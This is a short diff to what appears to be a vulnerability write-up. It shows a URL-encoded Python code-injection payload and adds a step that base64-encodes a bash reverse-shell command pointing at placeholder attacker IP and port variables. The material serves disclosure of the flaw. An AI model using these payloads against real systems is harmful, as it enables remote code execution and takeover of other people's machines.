@@ -46,3 +46,8 @@ To demonstrate how this leads to code execution, let's try the following:
 abc')%20%2b%20print('Code%20Execution%20possible!')%23%20
 ``` 
 ![image](https://github.com/user-attachments/assets/13445b76-739a-421a-ac3f-bc6ea4f74a46)
+
+To get a reverse shell, do the following:
+```bash
+echo -n "bash -c 'bash -i >& /dev/tcp/$(ATTACKER_IP)/$(ATTACKER_PORT) 0>&1'" | base64
+```
